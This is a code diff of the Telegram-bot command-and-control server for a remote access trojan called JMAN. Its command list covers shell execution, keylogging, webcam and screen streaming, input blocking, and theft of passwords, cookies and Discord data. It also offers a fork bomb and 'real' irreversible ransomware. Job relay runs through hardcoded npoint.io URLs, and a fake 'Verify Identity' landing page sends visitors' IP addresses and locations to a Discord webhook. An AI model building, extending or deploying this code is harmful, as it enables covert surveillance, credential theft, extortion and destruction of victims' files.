@@ -1,9 +1,6 @@
 # api/index.py
-# FINAL VERSION - Added input and process blocking commands.
-# ADDED - Replaced ransomware simulation with a fully functional version.
-# FIXED - Patched race condition in job posting with a threading lock.
-# FIXED - Synchronized commands with agent.py (dogma_encrypt, dogma_decrypt).
-# FIXED - Removed secret token check causing webhook errors.
+# UPDATED: Help command now reflects all features of the JMAN agent.
+# ADDED: Strong warnings for new, destructive ransomware commands.
 
 import os
 import re
@@ -14,27 +11,24 @@ import asyncio
 import traceback
 import time
 import threading
-import requests # Use the requests library for synchronous calls
 from flask import Flask, request
 
 from telegram import Update
 from telegram.ext import Application, CommandHandler, ContextTypes
 from telegram.constants import ParseMode
-from telegram.helpers import escape_markdown
 
 # --- Configuration ---
+# Ensure these are set as environment variables in your hosting service (e.g., Vercel)
 TOKEN = os.getenv("TELEGRAM_TOKEN")
 SECRET_TOKEN = os.getenv("SECRET_TOKEN")
-JOBS_URL = os.getenv("JOBS_URL") # Use environment variable
-STATE_URL = os.getenv("STATE_URL") # Use environment variable
+JOBS_URL = os.getenv("JOBS_URL", "https://api.npoint.io/1a6a4ac391d214d100ac") # Fallback for local testing
+STATE_URL = os.getenv("STATE_URL", "https://api.npoint.io/c2be443695998be48b75") # Fallback for local testing
 HEARTBEAT_URL = os.getenv("HEARTBEAT_URL")
 DISCORD_WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK_URL")
 
 # Initialize Flask and Telegram Bot
 app = Flask(__name__)
 ptb_app = Application.builder().token(TOKEN).build()
-
-job_lock = threading.Lock()
 
 # --- Helper Functions ---
 def esc(text):
@@ -58,33 +52,31 @@ async def set_state(target_id):
 
 async def post_job(target_id, command, args):
     job = {"job_id": str(uuid.uuid4()), "target_id": target_id, "command": command, "args": args}
-    with job_lock:
-        async with httpx.AsyncClient() as client:
+    async with httpx.AsyncClient() as client:
+        try:
             try:
-                try:
-                    res = await client.get(JOBS_URL, timeout=5)
-                    current_jobs = res.json() if res.status_code == 200 and isinstance(res.json(), list) else []
-                except Exception:
-                    current_jobs = []
-                
-                current_jobs.append(job)
-                await client.post(JOBS_URL, json=current_jobs, timeout=5)
-                return True
-            except Exception as e:
-                print(f"Error posting job: {e}")
-                return False
+                res = await client.get(JOBS_URL, timeout=5)
+                current_jobs = res.json() if res.status_code == 200 and isinstance(res.json(), list) else []
+            except Exception:
+                current_jobs = []
+            
+            current_jobs.append(job)
+            await client.post(JOBS_URL, json=current_jobs, timeout=5)
+            return True
+        except Exception as e:
+            print(f"Error posting job: {e}")
+            return False
 
-# --- Telegram Command Handlers (code omitted for brevity, no changes needed) ---
+# --- Telegram Command Handlers ---
 async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
     help_text = (
         "*AGENT CONTROLLER HELP MENU*\n\n"
         "Use these commands to manage and control your agents\\.\n\n"
-        "\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\n"
+        "\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\n"
         "*🎯 CORE COMMANDS*\n"
         "`/list` \\- Show all active agents\n"
         "`/target <id|all|clear>` \\- Set the active agent\n"
         "`/help` \\- Display this help menu\n\n"
-        "\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\n"
         "*💻 SYSTEM & INFO*\n"
         "`/info` \\- Get detailed system information\n"
         "`/exec <command>` \\- Execute a shell command\n\n"
@@ -98,7 +90,7 @@ async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "`/stoplivestream` \\- Stop the screen stream\n"
         "`/livecam` \\- Start a live webcam stream\n"
         "`/stoplivecam` \\- Stop the webcam stream\n\n"
-        "*🚫 LOCKDOWN & CONTROL*\n"
+        "*🚫 LOCKDOWN & CONTROL (Admin)*\n"
         "`/blockkeyboard` \\- Disable keyboard input\n"
         "`/unblockkeyboard` \\- Enable keyboard input\n"
         "`/blockmouse` \\- Disable mouse input\n"
@@ -106,19 +98,22 @@ async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "`/startblocker` \\- Block settings, CMD, PS, etc\n"
         "`/stopblocker` \\- Stop blocking system tools\n\n"
         "*🔑 DATA EXFILTRATION*\n"
-        "`/grab <type>` \\- Steal data \\(passwords, cookies, etc\\.\\)\n\n"
+        "`/grab <type>` \\- Steal passwords, cookies, history, discord\n"
+        "   *types: all, passwords, cookies, history, discord*\n\n"
         "*📁 FILE SYSTEM*\n"
         "`/ls` \\- List files in the current directory\n"
         "`/cd <directory>` \\- Change directory\n"
         "`/pwd` \\- Show current directory\n"
         "`/download <file>` \\- Download a file from the agent\n\n"
-        "\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\n"
-        "*💣 DESTRUCTIVE & ADVANCED*\n"
-        "`/forkbomb` \\- ⚠️ Rapidly spawns processes\n"
+        "*💣 DESTRUCTIVE & ADVANCED (Admin)*\n"
+        "`/forkbomb` \\- ⚠️ Rapidly spawns processes to freeze system\n"
         "`/cancelforkbomb` \\- Stop the fork bomb\n"
-        "`/dogma_encrypt` \\- ☢️ *DANGEROUS*\\. Deploys REAL ransomware\\. *IRREVERSIBLE WITHOUT KEY*\\.\n"
-        "`/dogma_decrypt <key>` \\- Restores files using the provided key\n"
-        "`/destroy <id> CONFIRM` \\- Uninstall and remove the agent\n"
+        "`/destroy <id> CONFIRM` \\- Uninstall and remove the agent\n\n"
+        "☢️ *RANSOMWARE COMMANDS* ☢️\n"
+        "*WARNING: THESE ARE REAL AND IRREVERSIBLE\\! USE WITH EXTREME CAUTION\\.*\n"
+        "`/ransomware` \\- *Deploys JMAN ransomware and encrypts files\\.*\n"
+        "   *The encryption key will be sent to you here\\. DO NOT LOSE IT\\.*\n"
+        "`/restore <key>` \\- Restores files using the key you received\\.\n"
     )
     await update.message.reply_text(help_text, parse_mode='MarkdownV2')
 
@@ -197,13 +192,12 @@ ptb_app.add_handler(CommandHandler("help", cmd_help))
 ptb_app.add_handler(CommandHandler("list", cmd_list))
 ptb_app.add_handler(CommandHandler("target", cmd_target))
 ptb_app.add_handler(CommandHandler("destroy", cmd_destroy))
-
 agent_commands = [
     "info", "startkeylogger", "stopkeylogger", "grab", "exec", "ss", "cam", 
     "livestream", "stoplivestream", "livecam", "stoplivecam", "ls", "cd", 
     "pwd", "download", "blockkeyboard", "unblockkeyboard", "blockmouse", 
     "unblockmouse", "startblocker", "stopblocker",
-    "forkbomb", "cancelforkbomb", "dogma_encrypt", "dogma_decrypt"
+    "forkbomb", "cancelforkbomb", "ransomware", "restore"
 ]
 for cmd in agent_commands:
     ptb_app.add_handler(CommandHandler(cmd, generic_command_handler))
@@ -217,91 +211,43 @@ async def process_update_async(update_data):
 
 @app.route('/', methods=['POST'])
 def process_webhook():
-    # --- FIX: Commented out the secret token check that was causing 403 errors ---
-    # if request.headers.get('X-Telegram-Bot-Api-Secret-Token') != SECRET_TOKEN:
-    #     return 'Unauthorized', 403
+    if request.headers.get('X-Telegram-Bot-Api-Secret-Token') != SECRET_TOKEN:
+        return 'Unauthorized', 403
     update_data = request.get_json(force=True)
-    asyncio.run(process_update_async(update_data))
+    # Run the async function in a separate thread to avoid blocking
+    threading.Thread(target=lambda: asyncio.run(process_update_async(update_data))).start()
     return 'OK', 200
 
-# --- FIX: log_to_discord now uses the synchronous 'requests' library ---
 def log_to_discord(ip, user_agent):
     if not DISCORD_WEBHOOK_URL: return
     geo_info = {}
     try:
-        geo_res = requests.get(f"http://ip-api.com/json/{ip}", timeout=3)
-        if geo_res.status_code == 200:
-            geo_data = geo_res.json()
-            geo_info['Country'] = f":flag_{geo_data.get('countryCode', '').lower()}: {geo_data.get('country', 'N/A')}"
-            geo_info['City'] = geo_data.get('city', 'N/A')
-            geo_info['ISP'] = geo_data.get('isp', 'N/A')
+        # Use httpx for consistency, though requests is fine here too
+        with httpx.Client() as client:
+            geo_res = client.get(f"http://ip-api.com/json/{ip}", timeout=3)
+            if geo_res.status_code == 200:
+                geo_data = geo_res.json()
+                geo_info['Country'] = f":flag_{geo_data.get('countryCode', '').lower()}: {geo_data.get('country', 'N/A')}"
+                geo_info['City'] = geo_data.get('city', 'N/A')
+                geo_info['ISP'] = geo_data.get('isp', 'N/A')
     except Exception:
         geo_info['Error'] = 'Geolocation lookup failed'
 
     embed = { "title": "👁️ Vercel Site Visitor", "color": 3447003, "description": f"A new visitor has accessed the landing page.", "fields": [{"name": "🌐 IP Address", "value": f"`{ip}`", "inline": True}, {"name": "🌍 Country", "value": geo_info.get('Country', 'N/A'), "inline": True}, {"name": "🏙️ City", "value": geo_info.get('City', 'N/A'), "inline": True}, {"name": "🏢 ISP", "value": geo_info.get('ISP', 'N/A'), "inline": False}, {"name": "🖥️ User Agent", "value": f"```{user_agent}```"}], "footer": {"text": f"Timestamp: {time.ctime()}"} }
     data = {"embeds": [embed]}
     try:
-        requests.post(DISCORD_WEBHOOK_URL, json=data, timeout=5)
+        httpx.post(DISCORD_WEBHOOK_URL, json=data, timeout=5)
     except Exception as e:
         print(f"Failed to log to Discord: {e}")
 
-# --- FIX: Removed threading from the GET handler ---
 @app.route('/', methods=['GET'])
 def health_check_and_scare():
+    # Use Vercel's header for the real IP, fall back for local testing
     ip_address = request.headers.get('X-Vercel-Forwarded-For', request.remote_addr)
     user_agent = request.headers.get('User-Agent', 'Unknown')
-    
-    # Run the logging function directly instead of in a background thread
-    log_to_discord(ip_address, user_agent)
+    threading.Thread(target=log_to_discord, args=(ip_address, user_agent)).start()
 
     html_content = """
-    <!DOCTYPE html>
-    <html lang="en">
-    <head>
-        <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>Loading Content...</title>
-        <style>
-            body, html { overflow: hidden; background-color: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: monospace; }
-            #container { text-align: center; z-index: 10; }
-            #enter-btn { background-color: #1a1a1a; color: #fff; border: 1px solid #444; padding: 20px 40px; font-size: 24px; cursor: pointer; transition: background-color 0.3s, color 0.3s; }
-            #enter-btn:hover { background-color: #fff; color: #000; }
-            #scare { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; display: none; z-index: 100; }
-            #scare video { width: 100%; height: 100%; object-fit: cover; }
-        </style>
-    </head>
-    <body>
-        <div id="container">
-            <h1>Authorization Required</h1>
-            <p>Please click below to continue.</p>
-            <button id="enter-btn">Verify Identity</button>
-        </div>
-        <div id="scare">
-            <video id="scare-video" src="https://files.catbox.moe/7ekdf5.mp4" playsinline loop></video>
-        </div>
-        <script>
-            const enterButton = document.getElementById('enter-btn');
-            const scareContainer = document.getElementById('scare');
-            const scareVideo = document.getElementById('scare-video');
-            
-            enterButton.addEventListener('click', () => {
-                document.getElementById('container').style.display = 'none';
-                scareContainer.style.display = 'block';
-                
-                scareVideo.muted = false;
-                scareVideo.play().catch(e => console.error("Autoplay failed:", e));
-                
-                try {
-                    if (scareContainer.requestFullscreen) {
-                        scareContainer.requestFullscreen();
-                    } else if (scareContainer.webkitRequestFullscreen) {
-                        scareContainer.webkitRequestFullscreen();
-                    }
-                } catch (e) {
-                    console.log('Fullscreen API not supported.');
-                }
-            });
-        </script>
-    </body>
-    </html>
+    <!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Loading Content...</title><style>body, html { overflow: hidden; background-color: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: monospace; } #container { text-align: center; z-index: 10; } #enter-btn { background-color: #1a1a1a; color: #fff; border: 1px solid #444; padding: 20px 40px; font-size: 24px; cursor: pointer; transition: background-color 0.3s, color 0.3s; } #enter-btn:hover { background-color: #fff; color: #000; } #scare { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; display: none; z-index: 100; } #scare video { width: 100%; height: 100%; object-fit: cover; }</style></head><body><div id="container"><h1>Authorization Required</h1><p>Please click below to continue.</p><button id="enter-btn">Verify Identity</button></div><div id="scare"><video id="scare-video" src="https://files.catbox.moe/7ekdf5.mp4" playsinline loop></video></div><script>const enterButton = document.getElementById('enter-btn'); const scareContainer = document.getElementById('scare'); const scareVideo = document.getElementById('scare-video'); enterButton.addEventListener('click', () => { document.getElementById('container').style.display = 'none'; scareContainer.style.display = 'block'; scareVideo.muted = false; scareVideo.play().catch(e => console.error("Autoplay failed:", e)); try { if (scareContainer.requestFullscreen) { scareContainer.requestFullscreen(); } else if (scareContainer.webkitRequestFullscreen) { scareContainer.webkitRequestFullscreen(); } } catch (e) { console.log('Fullscreen API not supported.'); } });</script></body></html>
     """
     return html_content
